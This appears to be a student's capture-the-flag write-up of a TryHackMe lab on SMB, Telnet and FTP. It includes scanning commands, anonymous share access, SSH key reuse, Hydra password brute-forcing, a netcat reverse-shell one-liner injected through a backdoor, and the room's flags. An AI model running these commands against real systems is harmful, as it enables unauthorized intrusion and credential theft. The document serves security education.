-------------------------------
# ROOM NAME: NETWORK SERVICES
# DATE: 19 June 2026
# PLATFORM: TryHackMe
-------------------------------

## 1. TOPIC OVERVIEW
-------------------------------
This room issues a tutorial for the overview on fundamental network services such as FTP, SMB , Telnet AND ssh. This tool promises hands on practical experience with known CVEs such as Sambacry(2017) for SMB. The goal is to understand the process of fundamental enumeration and exploitation to build an attacker mindset.

## 2. KEY CONCEPTS
-------------------------------
- **Concept 1**: Enumeration with Nmap, Enum4Linux, telnet and ftp shell.
- **Concept 2**: Exploitation of open ports for the protocols FTP,SMB and Telnet.
- **Concept 3**: Entry level brute force using the Open source online password cracking tool, Hydra.
- **Concept 4**: Hands on Experience with msfvenom for generating a reverse shell payload.

## 3. IMPORTANT COMMANDS
-------------------------------

### SMB

**Command:**
```bash
nmap -sC -sV -p- <IP>
```
**Explanation:**
- -sC → default scripts
- -sV → version detection
- -p- → Scan all ports (listed or unlisted)

**Example Output:**
The output might return Open ports, service version and other enumeration findings such as Anonymous logins allowed for FTP.

**Command:**
```bash
enum4linux -a [target_ip]
```
**Explanation:**
- enum4linux → an open source tool used for enumerating service running on smb.
- -a → All types of scans (Full basic enumeration)
- [target_ip] → The target's IP address.

**Example Output:**
The output may contain information related to different smb shares present on the service, the service version etc.

**Command:**
```bash
smbclient //[IP]/[SHARE] -U [USERNAME] -P [PORT]
```
(to bypass user/pass requirement)
In our case, the command was: smbclient //10.10.10.10/secrets -U Anonymous -p 445

**Explanation:**
- smbclient → Smb client is a tool used for accessing smb shares on the network.
- //[IP]/[SHARE] (//10.10.10.10/secrets)- Location of share in the target's ip = [IP] and Share name = [SHARE]
- -U [USERNAME] (Anonymous) → As the name suggests, username, if found during the enumeration phase must be present here.
- -P [PORT] (445) → As the name suggests, the port on which the smb service was suspected should be present here.
- -N → This is used to ignore the username/password and default port(445) is used for authentication in case the share allows Anonymous access, Null sessions OR Guest access.

**Example Output:**
If the credentials are correct, SMB shell will be opened. You can try cd [dir], ls/dir and similar commands in the shell for further enumeration.


**Command:** 
```bash
chmod 600 [FILE]
```
**Explanation:**
- chmod → Used to manipulate file permissions in the Linux File system.
- 600 → This refers to the Octal system, 4 + 2 -> 6; where 4 - read(r), 2 - write(w), 1 - execute(x). These can be used in place of rwx-rwx-rwx for owner, groups and others.
- [FILE] → The file who's permission is to be modified.

**Example Output:**
No output is there, but the permissions are given.

### SSH

**Command:** 
```bash
sudo ssh -i id_rsa -o PubkeyAuthentication=yes -o PasswordAuthentication=no username@target_ip
```
**Explanation:**
- sudo → Used for root/superuser access for performing a task in bash shell.
- ssh → SSH refers to secure shell. Default Port: 22, it is used for remote login and command execution.
- -i id_rsa → specifies the private key to use for authentication.
- -o PubkeyAuthentication=yes → Forces ssh to use Public Key Authentication
- -o PasswordAuthentication=no → Disables ssh for asking for password
- username@target_ip → The username for ssh shell @ ip address of the target/connection_destination.

**Example Output:**
If everything is correct, the output will be a remotely accessible shell. For eg: if Ubuntu is being remotely shared, 
Ubuntu 22.04
debian@user
$
The output will be similar to the above.


### TELNET

**Command:**
```bash
telnet [Target_IP] [Port]
```
**Explanation:**
- telnet → Telnet is a network service, client-server protocol 
- [Target_IP] → This is the actual target IP address we perform the enumeration on. 
- [Port] → This must be the open Port which is suspected to run telnet. In our case, it was 8012.

**Command:**
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[your_local_ip] lport=4444 R
```
**Explanation:**
- msfvenom → Metasploit's powerful payload generation tool.
- -p cmd/unix/reverse_netcat → Specifies the payload. In this case, we have a reverse shell which can be connected to and listened using netcat(/reverse_netcat) for accessing the command prompt(cmd) for UNIX/Linux OS (/unix)
- lhost=[your_local_ip] → This refers to the attacker's IP address on his network/ IP address of the attack machine.
- lport=4444 → Refers to the listening port using which the attacker can establish a listener on the victim.
- R → THis is used to Output the payload in raw format instead of generating an Executable.

**Example Output:**
```bash
mkfifo /tmp/f; nc 10.10.14.5 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
This payload can be executed into the telnet shell accessed using telnet [target_ip] [port].

**Command:**
```bash
ip addr show tun0
```
**Explanation:**

Since we're solving a TryHackMe lab, We have to either use their AttackBox machine, Or use our own VM while being connected to their VPN using OpenVPN service. Hence, we must find our attack machine's local IP on their VPN.

- ip → Represents that the command will show IP and related information
- addr → Represents Ip "address" must be present in the output.
- show → Required for output
- tun0 → Refers to tunnel zero(0) as we're connected to the TryHackMe VPN.

In case using attackthebox, 
```bash
sudo tcpdump ip proto \\icmp -i ens5
``` 
should be used as provided by the documentation.
If we're present locally on the network, then we must use our default network interface, such as: eth0(ethernet)/wlan0(wifi) or any other network interface which facilitates connection with the network.

**Example Output:**
```bash
3: tune: <POINTOPOINT, NOARP, UP, LOWER_UP> mtu 1380 qdisc noqueue state UP group default qlen 1000
link/none
inet 192.168.159.163/12 brd 192.168.181.254 scope global tune
valid_lft forever preferred_lft forever
inet6 fe80:: 87d5:9655:ffc0:e227/64 scope link stable-privacy proto kernel_ll
valid_lft forever preferred_lft forever
```

**Command:**
```bash
nc -lnvp 4444
```
**Explanation:**
- nc → Represents Netcat ("Swiss Army Knife" of networking).
- -l → Listen mode
- -n → NO DNS resolution
- -v → Verbose mode
- -p → port specification
- -lnvp → Combination of listen mode + NO DNS Resolution + Verbose Mode + Port Specification under one umbrella.
- 4444 → The actual listening port (We used the same during payload generation by msfvenom, Metasploit).


**Example Output:**
If everything goes well, the attacker should be able to access the listener and must gain access to the victim's resources. If the payload was a reverse shell, the netcat listener will open the victim's shell in the attacker's shell.


### FTP

**Command:**
```bash
ftp [target_ip]
```
**Explanation:**
- ftp → Stands for File transfer protocol. It is a client server protocol used for reliably sharing and accessing files over a network.
- [target_ip] → The victim's IP address.

Example Output:
If you're brought to a prompt that says: "ftp>", then you have a working FTP client.

**Commands:** 
```bash
ls
```
```bash
get filename.txt
```

**Explanation:**
FTP shell can use get for downloading files to local, attacker's machine and ls is used to list directories. Though Nmap is advanced enumeration tool and sometimes, the scan results might include the directories of ftp client if the ftp port is open.

**Example Output:**
The listing number, name and other information about the file for ls, and a prompt of download details and status in case get command is used.



### HYDRA

**Command:**
```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt ftp
```
**Explanation:**
hydra → A free open source tool for performing brute force attacks.
-t 4 → 4 parallel connections
-l [user] → Target user
-P [dir] → Password list intake
ftp → specifying protocol to brute force over.


## 4. PRACTICAL TASKS
-------------------------------

- Enumeration and scanning using Nmap and enum4linux.
- Payload generation using msfvenom and listener setup using tcpdump and netcat.
- Bruteforce attack using Hydra.
- Full scale exploitation of SMB, Telnet and FTP.


### Tools Used:
- Nmap
- enum4linux
- smbclient
- ssh
- telnet client
- msfvenom
- netcat
- ftp-client
- hydra

## 5. WORK FLOW
-------------------------------
#### Step-By-Step,
#### In total, there were 3 penetration tests performed on 3 different targets:

### Target 1: SMB Vulnerability: SambaCry(2017),"CVE-2017-7494"

1. Learnt Fundamentals of SMB Protocol -> Request-Response Protocol, working on client-server model.

2. Developed familiarity with "Samba", it's protocol suites (TCP/IP) and familiarity with Samba supported OS such as Windows 95 and ahead and UNIX based systems.

3. The Enumeration phase begins! The first and successful enumeration attempt was scanning using Nmap, with the command:
```bash
nmap -sV -sC -p- [target_ip]
```

4. 3 Open ports were found → (139,445) SMB,Samba and 1 other TCP Port.

<img width="940" height="221" alt="image" src="https://github.com/user-attachments/assets/66a20325-8242-4ad5-8660-33d7f75b4a53" />


5. Learnt fundamentals of enum4linux to continue with the enumeration.

6. Since we have found an open port running smb, enum4linux is a good choice for further enumeration.

7. Conducting a full basic enumeration with the command:
```bash
enum4linux -a [target_ip] 
```

8. The findings of full basic enumeration included:
- The WORKGROUP's name was: WORKGROUP 
- The machine's name was: POLOSMB
- Operating system's version was found out to be "6.1"
- One smb share was revealed named as "profiles". 

if the machine's name is hard to find, we can copy the output of full basic enumeration to any AI assistant for slight help. But it's worth to note that AI  assistants can't provide highly accurate results as of now and they should be used responsibly.


<img width="940" height="591" alt="image" src="https://github.com/user-attachments/assets/752aad4c-01a8-4444-a80a-03cb5928476f" />


9. Attempted to Access the SMB share "profiles" using the tool SMBclient with the following command:
**Syntax:**
```bash
smbclient //[IP]/[SHARE] -U [USERNAME] -p [PORT]
```
**Example:** 
```bash
smbclient //10.10.10.10/secrets -U Anonymous -p 445
```
But there was a catch! It was not being accessed by the user Anonymous even though the Anonymous Login was allowed for "profiles" share of SMB. Hence, EchoAI suggested: sudo smbclient //[target_ip]/profiles -N 
This command forces the connection without need of username and uses default port (445)

<img width="940" height="521" alt="image" src="https://github.com/user-attachments/assets/3ca3712e-ec56-4343-9b08-767b4dd2ac3d" />


10. Accessing the share, leading to smb shell, after listing directories, "Working From Home Information.txt" was found.

<img width="940" height="337" alt="image" src="https://github.com/user-attachments/assets/029ba06c-7d17-43d4-b816-091bd96137f4" />



11. The short note contained full name of an employee, "John Cactus", and the IT manager's email "it@polointernalcoms.uk" - James, Dept. Manage

<img width="940" height="726" alt="image" src="https://github.com/user-attachments/assets/d76204bb-85c5-480c-8af8-069261b9f631" />


12. The listed directories had a folder named .ssh, and the note mentioned "id_rsa" named ssh key to be present inside. 

13. Navigating to the folder, the id_rsa was present, downloaded the file into local attack machine using command: get id_rsa

  <img width="830" height="847" alt="image" src="https://github.com/user-attachments/assets/804ad3e8-3e19-4d1f-af08-fef0b75aa1b1" />

14. The ssh key was downloaded, but the permissions were yet to be manipulated for the locally downloaded file.

15. We must change the permissions of the AuthKey file in order to use it for connection.
```bash
    chmod 600 id_rsa 
```
The read and write permission for the "owner" of the file is given.

17. The ssh connection was confusing at first as there were no directions for ssh credentials. After several different lookups on the room documentation, the enumeration findings and different combinations of credentials, the username was found out to be "cactus" from the name "John Cactus" in the file present in SMB share.

18. Accessed Ubuntu system remotely using ssh client using the command:
```bash
sudo ssh -i id_rsa -o PubkeyAuthentication=yes -o PasswordAuthentication=no cactus@10.49.156.232
```
18. On listing directories, smb.txt was found containing the flag:
```bash
    THM{smb_is_fun_eh?}.
```

<img width="602" height="103" alt="image" src="https://github.com/user-attachments/assets/55c7112b-d623-415e-88b4-3689b9ced6ed" />


### Target 2: Telnet Exploitation

1. Learnt the fundamentals of Telnet Protocol, the client-server model for telnet protocol, the insecurity of telnet protocol, that it's messages are transmitted in plaintext.

2. It was worth to note that the Telnet protocol, default port:23 is now replaced by SSH as ssh transmits data in encrypted formats unlike telnet protocol.

3. Developed familiarity with Telnet client and telnet shell.

4. The enumeration phase begins! Scanned the target using Nmap:
```bash
   nmap -sC -sV -p- [target] and found one unlisted and open port - "8012"
```

<img width="940" height="303" alt="image" src="https://github.com/user-attachments/assets/44e052be-40e4-4dd1-88f2-e00ac8008144" />


5. The documentation directed to check for Telnet service on the port.

6. Checked if the open port 8012 was hosting telnet service using:
```bash
   telnet [target_ip] 8012.
```
It was advised to check if the telnet shell responded to any basic commands. It did respond to .HELP but it did not run any other commands. The documentation suggested a tcpdump ICMP listener in order to check if the commands are being executed. But there was no response of ICMP pings in the tcpdump listener.

<img width="713" height="173" alt="image" src="https://github.com/user-attachments/assets/edb33b81-6065-4fcb-8408-6791476d859c" />


7. The port was hosting telnet service and the welcome message said: "Skidy's Backdoor"

8. Following were the findings from our enumeration phase:
	- There is a poorly hidden telnet service running on this machine
	- The service itself is marked "backdoor"
	- We have possible username of "Skidy" implicated.

9. Got introducted with Msfvenom, a powerful tool of Metasploit used for generation of payloads.

10. In order to generate a payload using msfvenom, we require a listening hostname/IP and a Listening port. Hence, we use:
```bash
    "ip addr show tun0" 
```
as we're using our own Attack VM with THM OpenVPN server.
For attackbox, the documentation suggested: 
```bash
"sudo tcpdump ip proto \\icmp -i ens5"
```

<img width="940" height="171" alt="image" src="https://github.com/user-attachments/assets/69dec0bd-7262-4a7a-934f-a58e436e34fa" />


11. Using the Listening Ip and port (decided as 4444), it was time to generate the payload:
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[listening_ip/hostname] lport=4444 R
```
It's worth to note that the payload's output is generated in RAW format as specified in the command as "R".

The generated Payload:
```bash
mkfifo /tmp/f; nc 10.10.14.5 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

13. The payload generation was done. Hence, a netcat listener was required. Opened a netcat listener using:
```bash
nc -lnvp 4444
```

<img width="534" height="139" alt="image" src="https://github.com/user-attachments/assets/5cedfaec-6642-4f0c-99dd-4fb95282ad32" />


14. Once the netcat listener was ready, the payload was pasted into the telnet shell which was connected to in the 6th step, prefaced with .RUN.
That is,
```bash
.RUN mkfifo /tmp/f; nc 10.10.14.5 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

<img width="940" height="339" alt="image" src="https://github.com/user-attachments/assets/9f797e29-f3c7-417d-92eb-2e759c94ad67" />


15. Once the payload is executed, the netcat listener connects to target's command shell.

16. Executing "whoami" gives "root", listing directories using "ls" shows a file "flag.txt".

<img width="914" height="263" alt="image" src="https://github.com/user-attachments/assets/cb0a4839-5dbf-4bdf-84ff-014ac32b765a" />

17. Reading the file using "cat flag.txt", the flag was found:
```bash
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

### Target 3: FTP Exploitation


1. Learnt the core fundamentals of FTP(File transfer Protocol). The documentation was a to the point orientation with relevant theory useful for real life penetration testing, including active and passive connections using FTP.

2. The first was to Scan and Enumerate the target. Hence, the target was scanned using Nmap:
```bash
   nmap -sC -p- [target_ip].
```

<img width="940" height="757" alt="image" src="https://github.com/user-attachments/assets/031fc35e-ca2c-4976-bfe8-4a6f31536e1e" />


4. The findings from Nmap included shockingly detailed enumeration results:

	- 3 open ports were found: Port 21:FTP, Port 80:Http Apache 	and port 	22:TCP/ssh.
	- Since the FTP service was poorly hidden, the nmap scan was also able to 	find FTP file listings, that was: "PUBLIC_NOTICE.txt" at 353.
	- The FTP service allowed Anonymous logins and FTP variant was: "vsftpd". (-sV tag required with nmap scan)

5. Misconfigured FTP services are often easier to enumerate and abuse than many modern services. We can simply connect to FTP using:
```bash
ftp [target_ip]
```
When asked for username and password, username: Anonymous ; password: ; 

<img width="940" height="360" alt="image" src="https://github.com/user-attachments/assets/23013470-1803-4771-8f1f-2798df0db57c" />


5. Listing directories inside the ftp shell confirms the existence of PUBLIC_NOTICE.txt

6. Using the "get filename.txt" command, we can download PUBLIC_NOTICE.txt into the attack machine.

<img width="940" height="410" alt="image" src="https://github.com/user-attachments/assets/38c7b345-813a-4658-90b2-3275aa0f5f27" />


7. Following are the findings acquired from the enumeration phase:

	- 3 Open Ports: 21(ftp),80(http) and 22(ssh)
	- FTP Anonymous login is allowed.
	- PUBLIC_NOTICE.txt reveals a possible username - "mike".

8. Since we have a possible username, we can perform Dictionary Attack using Hydra.

9. Developed the learning of fundamental method to perform Dictionary attacks using Hydra

10. Found the password as "password" for the user by Dictionary Attack using Hydra:
```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt ftp
```
This is a critical vulnerability as "password" is a default credentials and is highly vulnerable.

<img width="940" height="383" alt="image" src="https://github.com/user-attachments/assets/c542efc2-8202-49dc-be49-feb1379d4d86" />

11. Connected ftp using the credentials : Username: mike, Password: password.

12. Listing directories within user mike, "ftp.txt" is found which contains the flag:
```bash
THM{y0u_g0t_th3_ftp_fl4g}
```

<img width="940" height="459" alt="image" src="https://github.com/user-attachments/assets/a6a22f8a-0470-4f1d-852a-bdedda7ad7dd" />

<img width="940" height="156" alt="image" src="https://github.com/user-attachments/assets/1b9532bc-bc43-448d-a3a0-e45d06dbd304" />


##6. MISTAKES / CONFUSIONS
-------------------------------
- In the beginning, the SMB client's shell felt like user's actual command shell
- During the initial phase of this room, it felt Nmap is the only enumeration tool required. Turns out, there is much more to enumeration than Nmap.
- One open port leads to larger attack surface
- Confused ssh with telnet until the documentation stated why telnet is replaced with ssh in the industry.

##7. KEY LEARNINGS
-------------------------------
- The enumeration tactics for poorly hidden SMB, Telnet and FTP services on a network
- Performing Brute Force attack using Hydra, which can be used against services that allow password authentication and lack adequate protections such as account lockouts, rate limiting, MFA, or brute-force detection. (OWASP Top 10 2021 - Authentication Failures)
- Payload Generation Using msfvenom, Metasploit which can be used for reverse shell with netcat in case some service is left open.
- Nmap is a very strong tool which can enumerate using latest scripts in the NSE(Nmap Scripting Engine) and is a key tool for the enumeration phase.
- FTP, telnet connection facilitation.
- Default Ports for Common Network Services: https:443;http:80;ftp:21;ssh:22;telnet:23;rdp:3389,smb:445.
- Methods to use existing CVEs to attack advantage, building an attacker mindset.
- Hands on experience with Existing CVEs like SambaCry(2017).

##8. QUICK NOTES (REVISION)
-------------------------------
- SMB, FTP and Telnet work on the Client-Server Model.
- SMB stands for Server Message Block. Default port: 445, used for sharing access to files, pointers, serial ports and other resources on a network. It does everything similar to a file system, but over a network.
- SMB has historically been used by Windows systems and is also supported on Linux/Unix through Samba.
- Enumeration of an SMB share can be performed using enum4linux (full basic enumeration using -a).
- SMBclient is a ftp like client required to access SMB/CIFS resources on network. It facilitates ls, cd [dir] and get [file] commands for the share file system.
- Syntax for viewing an smb share using smbclient:
```bash
 smbclient //[target_ip]/[share_name] -U [username] -P [port]
```
- Syntax for viewing an smb share without the need of Username and use default port:
```bash
smbclient //[target_ip]/[share_name] -N
```
This is commonly used when the share permits anonymous access, guest access, or null sessions.
- SSH stands for Secure Shell. Default Port: 22. It is a cryptographic protocol(unlike telnet) which allows encrypted communication between Client and Remote server.
- SSH connections can be linked using Authentication keys as well in place of using passwords.
Here's how it's done:
```bash
sudo ssh -i Auth_Key -o PubkeyAuthentication=yes -o PasswordAuthentication=no username@target_ip.
```
- Telnet Protocol allows users to connect and execute commands on a remote machine which is hosting a telnet service using a telnet client. Unlike ssh, it transmits every communication message in Plain Text making it an insecure choice in real world scenarios.

- Syntax for using Telnet: 
```bash
telnet [target_ip] [port]
```
- A shell refers to a piece of code or program which can be used to gain code or command execution on a device. 

Reverse Shell is a type of shell in which the lab Machine initiates communication with the attack machine.

- A reverse shell requires a payload to execute on the target machine and connect back to a listener running on the attacker's machine.

To open a tcpdump ICMP listener:
```bash
sudo tcpdump ip proto \\icmp -i [network_interface]
```

- Payload generation using msfvenom with netcat listener:
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[your_local_ip] lport=4444 R
```
generated payload: 
```bash
mkfifo /tmp/f; nc 10.10.14.5 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
- FTP stands for File Transfer Protocol. Default Port: 21, as the name suggests, it's used to efficiently and reliably transfer files over a network.

- A typical FTP session operates two channels: Command(or Control) and data channel.

- There are 2 types of models/connections of FTP:
	1. Active - Client opens port and listens, server actively participates.
	2. Passive - Server opens a port and client connects to it.
- There are different variants of FTP servers which reply differently to connection requests. For eg: On using a command: cwd John, One FTP server replies "Access Denied" for every request, meanwhile another variant replies "directory exists, Access denied". This can be of advantage to an attacker.

- Usage of FTP:
```bash
ftp [target_ip]
```
It will ask for Username and Password for Authentication. If Anonymous logins are allowed, we can use username: Anonymous and leave password blank when asked for it.

- HYDRA is a powerful and quick open source brute force attack tool which can perform many types of Dictionary, Password Spraying Attacks efficiently.

- Usage Syntax for Dictionary Attack: 
```bash
hydra -t [threads_parallel_connections] -l [user] -P /usr/share/wordlists/rockyou.txt -vV [IP] [PROTOCOL]
```
The "-vV" is used for increasing the verbosity. But it's to note to that increasing verbosity increases loudness.
